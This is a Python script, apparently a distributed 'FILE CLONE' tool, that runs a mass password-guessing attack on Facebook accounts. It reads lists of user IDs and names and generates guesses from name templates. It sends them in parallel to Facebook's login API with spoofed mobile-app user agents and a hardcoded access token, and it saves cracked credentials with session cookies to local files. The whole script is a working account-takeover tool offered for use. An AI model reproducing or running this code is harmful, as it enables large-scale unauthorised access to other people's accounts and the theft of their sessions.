#-*-coding:utf-8-*-
#!/usr/bin/python3
#--------------(- IMPORT -)---------------#
import requests,random,uuid,string,hashlib,json
import os,base64,zlib,pip,urllib,urllib3,platform,math
import smtplib,json,time,re,random,sys,re
import uuid,subprocess,string,datetime
from io import BytesIO
import pycurl,certifi
from concurrent.futures import ThreadPoolExecutor
try:
	from string import *
	from os import path
	from urllib.request import urlopen
	from datetime import datetime,timedelta
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError:
	os.system('pip install requests futures==2 > /dev/null')
except:pass
#--------------(- LOOP -)---------------#
totaldmp = 0;count = 0;loop = 0;oks = [];cps = [];id = [];ps = [];sid = [];total=[];methods = [];srange = 0;saved = [];totaldmp = 0;filter = [];loop,ok,cp,user = 0,[],[],[];cok,plist = [],[]
#--------------(- SYS -)---------------#
sys.stdout.write('\x1b]2; JUYEL\x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#--------------(- COLOUR -)---------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#--------------(- LINEX -)---------------#
def clear():os.system('clear');print(logo)
def linex():print(f'\x1b[1;97m─────────────────────────────────────')
#--------------(- UPDATE -)---------------#
def _____UpDaTe_xOx_____():
	fb_version=f"{random.randint(138, 533)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(19, 63)}.{random.randint(79, 118)}"
	fb_version_code=str(random.randint(10000000, 66666666))
	application_version_code=str(random.randint(000000000,999999999))
	dwh = random.choice(["1080|2.6|1920","720|1.8|1600","720|2.0|1600","720|1.3|1560","720|2.0|1440","1080|2.0|2460","720|2.0|1500","720|2.0|1440","720|1.6|1613","1080|2.3|2408"])
	density = dwh.split('|')[1];width = dwh.split('|')[0];height = dwh.split('|')[2]
	sim_oparetor=random.choice(['Orange EG', 'Vodafone', 'AT&amp-T', 'Zong', 'MTS RUS', 'Airtel', 'Marshmallow', 'O2.CZ', 'JAZZTEL', 'YES OPTUS', 'Telstra', 'Telkomsel', 'elephone', 'MTN-CG', 'Tele2 LT', 'Verizon', 'Unitel STP', 'MegaFon', 'MTN', 'Movistar', 'Turk Telekom', 'T-Mobile', 'VINAPHONE', 'LoneStar', 'UNEFON 4G', 'MASMOVIL', 'Bouygues Telecom', 'Metfone', 'AT&amp;amp-T', 'Astelit-LIFE', 'XL Axiata', 'PLAY (T-Mobile)', 'Digi.Mobil', 'Verizon Wireless', 'SAZKAmobilCZ', 'PosteMobile', 'TELCEL', 'lifecell', 'Yoigo', 'vodafone.de', 'PosteMobile', 'Tele2 LT', 'Claro BR', 'O2 - UK', 'Willkommen', 'VIETTEL', 'U.S. Cellular', 'Metro by T-Mobile', 'TelkomSA', 'ADT-Mobile', 'VIVACOM', 'lifecell', 'S COMVIQ', 'TRUE-H', 'GLOBE', 'VIETTEL', 'U.S. Cellular'])
	country_code=random.choice(["en_US", "en_GB","es_ES"])
	android_oparetor=f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	build=random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	mobile_model=random.choice(["Tecno Mobile-X554","Tecno Mobile X626B","Tecno Mobile X689F","Tecno Mobile X620B","Tecno Mobile X657","Tecno Mobile X6816C","Tecno Mobile-X552","Tecno Mobile X693","Tecno Mobile X509","Tecno Mobile X603"])
	end1=f"[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBCR/{str(sim_oparetor)};FBMF/Tecno Mobile;FBBD/Tecno Mobile;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(android_oparetor)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua1=f'Davik/2.1.0 (Linux; U; Android {str(android_oparetor)}; '+str(mobile_model)+' Build/'+str(build)+') '+end1
	end2=f"[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_oparetor)};FBMF/Tecno Mobile;FBBD/Tecno Mobile;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(android_oparetor)};FBOP/1;FBCA/arm64-v8a:;]"
	ua2=f'Davik/2.1.0 (Linux; U; Android {str(android_oparetor)}; '+str(mobile_model)+' Build/'+str(build)+') '+end2
	end3=f"[FBAN/Orca-Android;FBAV/{str(fb_version)};FBPN/com.facebook.orca;FBLC/{str(country_code)};FBBV/{str(fb_version_code)};FBCR/{str(sim_oparetor)};FBMF/Tecno Mobile;FBBD/Tecno Mobile;FBDV/{str(mobile_model)};FBSV/{str(android_oparetor)};FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;] FBBK/1"
	ua3=f'Davik/2.1.0 (Linux; U; Android {str(android_oparetor)}; '+str(mobile_model)+' Build/'+str(build)+') '+end3
	end4=f"[FBAN/Orca-Android;FBAV/{str(fb_version)};FBPN/com.facebook.orca;FBLC/{str(country_code)};FBBV/{str(fb_version_code)};FBCR/{str(sim_oparetor)};FBMF/Tecno Mobile;FBBD/Tecno Mobile;FBDV/{str(mobile_model)};FBSV/{str(android_oparetor)};FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"
	ua4=f'Davik/2.1.0 (Linux; U; Android {str(android_oparetor)}; '+str(mobile_model)+' Build/'+str(build)+') '+end4
	ua5=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_oparetor)};FBMF/Tecno Mobile;FBBD/Tecno Mobile;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(android_oparetor)};FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua6=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_oparetor)};FBMF/Tecno Mobile;FBBD/Tecno Mobile;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(android_oparetor)};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	return random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
#--------------( APV )--------------#
K2=str(os.getgid())
num_key="X1".join(K2).upper()
def __ApV__():
	url="https://github.com/juyelrana1902/approval/blob/main/approval.txt"
	try:
		buffer = BytesIO()
		curl = pycurl.Curl()
		curl.setopt(curl.URL, url)
		curl.setopt(curl.WRITEDATA, buffer)
		curl.setopt(curl.CAINFO, certifi.where())
		curl.perform()
		curl.close()
		datax=buffer.getvalue().decode('utf-8')
	except Exception as e:
		sys.exit("\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m INTERNET ERROR...")
	if num_key in datax:
		menu()
	else:
		clear()
		print("\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m KEY NOT APPROVED ")
		sys.exit()
#--------------(- LOGO -)---------------#
logo =f"""\x1b[1;97m
\x1b[1;97m   ▜▘▌ ▌▌ ▌▛▀▘▌   ▛▀▖▞▀▖▙ ▌▞▀▖
\x1b[38;5;46m   ▐ ▌ ▌▝▞ ▙▄ ▌   ▙▄▘▙▄▌▌▌▌▙▄▌
\x1b[38;5;46m  ▌▐ ▌ ▌ ▌ ▌  ▌   ▌▚ ▌ ▌▌▝▌▌ ▌
\x1b[1;97m  ▝▘ ▝▀  ▘ ▀▀▘▀▀▘ ▘ ▘▘ ▘▘ ▘▘ ▘\x1b[38;5;46m PVT
\x1b[1;97m─────────────────────────────────────
\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m OWNER    \x1b[1;97m:\x1b[38;5;46m JUYEL RANA
\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m TOOLTYPE \x1b[1;97m:\x1b[38;5;46m FILE \x1b[38;5;196m•\x1b[38;5;46m CLONE
\x1b[1;97m─────────────────────────────────────
\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m kEY \x1b[1;97m:\x1b[38;5;221m {num_key}
\x1b[1;97m─────────────────────────────────────"""
#--------------(- RESULT -)---------------#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r\x1b[1;97m─────────────────────────────────────')
        print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK \x1b[1;97m:\x1b[38;5;46m %s' % str(len(oks)))
        print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP \x1b[1;97m:\x1b[1;93m %s' % str(len(cps)))
        print(f'\r\x1b[1;97m─────────────────────────────────────')
        exit()
#--------------(- MENU -)---------------#
def menu():   
    clear()
    print(f'\x1b[38;5;196m[\x1b[38;5;46m1\x1b[38;5;196m]\x1b[38;5;46m FILE CLONING')
    print(f'\x1b[38;5;196m[\x1b[38;5;46m2\x1b[38;5;196m]\x1b[38;5;46m CONTACT OWNER')
    print(f'\x1b[38;5;196m[\x1b[38;5;46m0\x1b[38;5;196m]\x1b[38;5;46m EXIT TOOLS')
    linex()
    select = input(f'\x1b[38;5;196m[\x1b[38;5;46m?\x1b[38;5;196m]\x1b[38;5;46m CHOICE \x1b[1;97m:\x1b[38;5;46m ')
    if select =='1':
        _file_()
    elif select =='2':
        os.system('xdg-open https://www.facebook.com/shakibboss422');menu()
    elif select =='0':
        exit(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m EXIT DONE ')
    else:
        print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m VALID OPTION')
        time.sleep(2)
        menu()
#--------------(- FILE -)---------------#      
def _file_():
    global methods
    clear()
    print(f'\x1b[38;5;196m[\x1b[38;5;46m1\x1b[38;5;196m]\x1b[38;5;46m METHOD \x1b[38;5;196m[\x1b[38;5;46mM1\x1b[38;5;196m]\x1b[38;5;46m ')
    print(f'\x1b[38;5;196m[\x1b[38;5;46m2\x1b[38;5;196m]\x1b[38;5;46m METHOD \x1b[38;5;196m[\x1b[38;5;46mM2\x1b[38;5;196m]\x1b[38;5;46m ')
    linex()
    option = input(f'\x1b[38;5;196m[\x1b[38;5;46m?\x1b[38;5;196m]\x1b[38;5;46m CHOICE \x1b[1;97m:\x1b[38;5;46m ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='0':
        _file_()
    else:
      print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m VALID OPTION')
      time.sleep(2)
      _file_()
#--------------(- CRACK -)---------------#      
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m EXAMPLE \x1b[1;97m:\x1b[38;5;46m /sdcard/JUYEL.txt');linex()
        self.file = input(f'\x1b[38;5;196m[\x1b[38;5;46m?\x1b[38;5;196m]\x1b[38;5;46m FILE NAME \x1b[1;97m:\x1b[38;5;46m ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)
#--------------(- PASSWORD -)---------------#
    def pasw(self):       
            pw = []
            clear()
            sl = int(input(f'\x1b[38;5;196m[\x1b[38;5;46m?\x1b[38;5;196m]\x1b[38;5;46m PASSWORD LIMIT \x1b[1;97m:\x1b[38;5;46m '))
            clear()
            print(f'\x1b[38;5;196m[\x1b[38;5;46m?\x1b[38;5;196m]\x1b[38;5;46m EXAMPLE \x1b[1;97m:\x1b[38;5;46m first123 \x1b[1;97m|\x1b[38;5;46m firstlast')
            linex()
            if sl =='':
                print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m PASSWORD NO \x1b[38;5;196m[\x1b[38;5;46m{sr+1}\x1b[38;5;196m] \x1b[1;97m:\x1b[38;5;46m '))
            clear()
            print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \x1b[1;97m:\x1b[38;5;46m %s ' % len(self.id))
            print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m PASSWORD \x1b[1;97m:\x1b[38;5;46m {sl} ')
            print(f'\x1b[38;5;196m[\x1b[38;5;46m√\x1b[38;5;196m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;46mON\x1b[1;97m|\x1b[1;93mOFF\x1b[38;5;46m AIRPLANE MODE ')
            linex()
            with tred(max_workers=30) as JUYELworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                JUYELworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                JUYELworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
#--------------(- FILE METHOD M1 -)---------------#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[38;5;196m[\x1b[38;5;46mJUYEL-M1\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK\x1b[1;97m|\x1b[1;93mCP\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m{len(oks)}\x1b[1;97m|\x1b[1;93m{len(cps)}\x1b[38;5;196m] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': _____UpDaTe_xOx_____(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JUYELb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JUYELb};{ckkk}"
                    print(f"\r\r\x1b[38;5;196m[JUYEL-OK] {sid} | {ps} ")
                    open('/sdcard/JUYEL-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{Y}[JUYEL-CP] {sid} | {ps} ")
                     open('/sdcard/JUYEL-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#--------------(- FILE METHOD M2 -)---------------#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[38;5;196m[\x1b[38;5;46mJUYEL-M2\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK\x1b[1;97m|\x1b[1;93mCP\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m{len(oks)}\x1b[1;97m|\x1b[1;93m{len(cps)}\x1b[38;5;196m] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': _____UpDaTe_xOx_____(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JUYELb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JUYELb};{ckkk}"
                    print(f"\r\r\x1b[38;5;196m[JUYEL-OK] {sid} | {ps} ")
                    open('/sdcard/JUYEL-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{Y}[JUYEL-CP] {sid} | {ps} ")
                    open('/sdcard/JUYEL-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)
#--------------(- END -)---------------#
if __name__ == "__main__":
	__ApV__()